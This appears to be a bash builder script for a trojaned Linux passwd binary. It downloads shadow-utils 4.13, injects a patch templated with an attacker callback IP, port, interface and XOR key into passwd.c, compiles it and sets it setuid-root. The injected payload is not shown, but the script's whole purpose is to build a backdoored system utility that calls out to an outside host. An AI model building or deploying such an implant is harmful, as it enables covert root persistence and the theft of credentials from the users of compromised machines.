#!/bin/bash

## Check if Root ##
if [ "$EUID" -ne 0 ]; then 
  echo "Must run as superuser"
  echo "Usage : ./generate.sh {Callback IP} {Port} {Interface} {XOR Key}"
  exit
fi

## Check if Correct Number of Variables ##
if [ $# -ne 4 ]; then
  echo "Illegal number of parameters"
  echo "Usage : ./generate.sh {Callback IP} {Port} {Interface} {XOR Key}"
  exit
fi

## Assign Variables ##
ip=$1
port=$2
interface=$3
key=$4
echo -ne "==Parameters Chosen==\n  IP : ${ip}\n  Port : ${port}\n  Interface : ${interface}\n  XOR Key : ${key}\n\nContinuing in 5 Seconds\nCtrl+c to Cancel : "
sleep 5

## Get dependancies and autogen ## (DEPRECIATED FOR COMPATABILITY)
#sudo apt install -y make autoconf autopoint libtool xsltproc bison byacc python3-pip
#sudo pip3 install python-dotenv

## Download Shado Source ###
wget -nc https://github.com/shadow-maint/shadow/archive/refs/tags/4.13.tar.gz -O shadow.tar.gz
tar -xf shadow.tar.gz

## Run Autogen Script ##
cd shadow-4.13
FILE=Makefile
if [ ! -f "$FILE" ]; then
    ./autogen.sh --without-selinux
fi
cd ../

## Add Inject Code to Source ##
cp passwdTemp.patch passwd.patch
sed -i 's/%ip%/'"$ip"'/g' passwd.patch
sed -i 's/%port%/'"$port"'/g' passwd.patch
sed -i 's/%int%/'"$interface"'/g' passwd.patch 
sed -i 's/%key%/'"$key"'/g' passwd.patch 
tar -xf shadow.tar.gz shadow-4.13/src/passwd.c
cd shadow-4.13
patch src/passwd.c ../passwd.patch 

## Make ##
make all 
cd ../
cp shadow-4.13/src/passwd ./passwd
chmod 4755 passwd 
